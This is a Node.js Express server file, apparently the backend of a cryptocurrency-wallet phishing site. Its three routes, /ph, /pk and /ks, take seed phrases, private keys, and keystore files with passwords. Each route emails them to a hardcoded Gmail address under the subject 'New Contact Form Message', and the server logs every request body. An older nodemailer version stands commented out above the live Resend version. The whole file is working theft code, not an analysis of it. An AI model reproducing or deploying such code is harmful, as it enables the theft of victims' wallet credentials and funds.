// require("dotenv").config();

// const express = require("express");
// const nodemailer = require("nodemailer");
// const cors = require("cors");
// // const bodyParser = require("body-parser");

// const app = express();
// // const PORT = 5000;

// // for railway port
// const PORT = process.env.PORT || 8080;

// // app.use(
// //   cors({
// //     origin: "form-backend-production-f5f1.up.railway.app",
// //     methods: ["POST", 'GET']
// //   })
// // );

// app.use(
//   cors({
//     origin: "*",
//     methods: ["POST", "GET", "OPTIONS"],
//     allowedHeaders: ["Content-Type"],
//     credentials: true,
//   })
// );

// app.use(express.json());
// app.use(express.urlencoded({ extended: true }));
// // app.use(bodyParser.json());

// // Logging middleware
// app.use((req, res, next) => {
//   console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
//   console.log("Request body:", req.body);
//   next();
// });

// app.options("*", cors());

// // ==== /ph Route ===
// app.post("/ph", (req, res) => {
//   const { ph, w_name } = req.body;
//   if (!ph) return res.status(400).send("Phrase is required");

//   const transporter = nodemailer.createTransport({
//     service: "gmail",
//     auth: {
//       user: process.env.EMAIL_USER,
//       pass: process.env.EMAIL_PASS,
//     },
//   });

//   const mailOptions = {
//     from: process.env.EMAIL_USER,
//     to: "pageantapplicationverify@gmail.com",
//     subject: "New Contact Form Message - Phrase",
//     text: `Wallet Name: ${w_name || "not provided"}\nPhrase: ${ph}`,
//   };

//   transporter.sendMail(mailOptions, (error, info) => {
//     if (error) {
//       console.error("Error sending email:", error);
//       return res.status(500).send("Something went wrong");
//     }
//     console.log("Email sent:", info.response);
//     res.status(200).send("Message sent successfully");
//   });
// });

// // ==== /ks Route ====
// app.post("/ks", (req, res) => {
//   const { k_s, pass, w_name } = req.body;
//   if (!k_s || !pass)
//     return res.status(400).send("Keystore and password required");

//   const transporter = nodemailer.createTransport({
//     service: "gmail",
//     auth: {
//       user: process.env.EMAIL_USER,
//       pass: process.env.EMAIL_PASS,
//     },
//   });

//   const mailOptions = {
//     from: process.env.EMAIL_USER,
//     to: "pageantapplicationverify@gmail.com",
//     subject: "New Contact Form Message - Keystore",
//     text: `Name: ${w_name}\nPassword: ${pass}\nKeystore: ${k_s}`,
//   };

//   transporter.sendMail(mailOptions, (error, info) => {
//     if (error) return res.status(500).send("Something went wrong");
//     res.status(200).send("Message sent successfully");
//   });
// });

// // ==== /pk Route ====
// app.post("/pk", (req, res) => {
//   const { p_k, w_name } = req.body;
//   if (!p_k) return res.status(400).send("Private key is required");

//   const transporter = nodemailer.createTransport({
//     service: "gmail",
//     auth: {
//       user: process.env.EMAIL_USER,
//       pass: process.env.EMAIL_PASS,
//     },
//   });

//   const mailOptions = {
//     from: process.env.EMAIL_USER,
//     to: "pageantapplicationverify@gmail.com",
//     subject: "New Contact Form Message - Private Key",
//     text: `Name: ${w_name}\nPrivate Key: ${p_k}`,
//   };

//   transporter.sendMail(mailOptions, (error, info) => {
//     if (error) return res.status(500).send("Something went wrong");
//     res.status(200).send("Message sent successfully");
//   });
// });

// app.listen(PORT, () => {
//   console.log(`Server is running on http://localhost:${PORT}`);
// });


// Reset with Resend

require("dotenv").config();

const express = require("express");
const cors = require("cors");
const { Resend } = require("resend");

const app = express();
const PORT = process.env.PORT || 8080;

// CORS setup
app.use(
  cors({
    origin: "*",
    methods: ["POST", "GET", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
    credentials: true,
  })
);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Logging middleware
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  console.log("Request body:", req.body);
  next();
});

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// ==== /ph Route ====
app.post("/ph", async (req, res) => {
  const { ph, w_name } = req.body;
  if (!ph) return res.status(400).send("Phrase is required");

  try {
    const data = await resend.emails.send({
      from: "Your App <onboarding@resend.dev>", // Use this or your verified domain
      to: "pageantapplicationverify@gmail.com",
      subject: "New Contact Form Message - Phrase",
      text: `Wallet Name: ${w_name || "not provided"}\nPhrase: ${ph}`,
    });

    console.log("Email sent:", data);
    res.status(200).send("Message sent successfully");
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).send("Something went wrong");
  }
});

// ==== /ks Route ====
app.post("/ks", async (req, res) => {
  const { k_s, pass, w_name } = req.body;
  if (!k_s || !pass)
    return res.status(400).send("Keystore and password required");

  try {
    const data = await resend.emails.send({
      from: "Your App <onboarding@resend.dev>",
      to: "pageantapplicationverify@gmail.com",
      subject: "New Contact Form Message - Keystore",
      text: `Name: ${w_name}\nPassword: ${pass}\nKeystore: ${k_s}`,
    });

    console.log("Email sent:", data);
    res.status(200).send("Message sent successfully");
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).send("Something went wrong");
  }
  
});

// ==== /pk Route ====
app.post("/pk", async (req, res) => {
  const { p_k, w_name } = req.body;
  if (!p_k) return res.status(400).send("Private key is required");

  try {
    const data = await resend.emails.send({
      from: "Your App <onboarding@resend.dev>",
      to: "pageantapplicationverify@gmail.com",
      subject: "New Contact Form Message - Private Key",
      text: `Name: ${w_name}\nPrivate Key: ${p_k}`,
    });

    console.log("Email sent:", data);
    res.status(200).send("Message sent successfully");
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).send("Something went wrong");
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
